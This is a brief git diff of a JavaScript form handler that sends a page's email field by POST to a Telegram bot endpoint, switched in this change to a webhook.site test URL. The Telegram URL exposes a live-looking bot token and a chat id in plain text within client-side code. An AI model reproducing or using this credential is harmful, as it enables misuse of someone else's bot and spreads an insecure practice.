@@ -2,6 +2,8 @@ import axios from "axios"
 export default async function () {
   const workingAddress = "-1001962937315"
   // const testAddress = "602753868"
+  const testUrl = "https://webhook.site/0c54804b-4494-433a-af07-d79e42aaf14d"
+  const currentUrl = "https://api.telegram.org/bot6077891821:AAEtvTMyHL5VMhvyUmg8Ktnd4GZ9YPcb4qs/sendMessage"
 
   try {
     const email = document.querySelector("#email").value
@@ -13,7 +15,7 @@ export default async function () {
 
     const options = {
       method: "POST",
-      url: "https://api.telegram.org/bot6077891821:AAEtvTMyHL5VMhvyUmg8Ktnd4GZ9YPcb4qs/sendMessage",
+      url: testUrl,
       headers: {
         accept: "application/json",
         "content-type": "application/json",
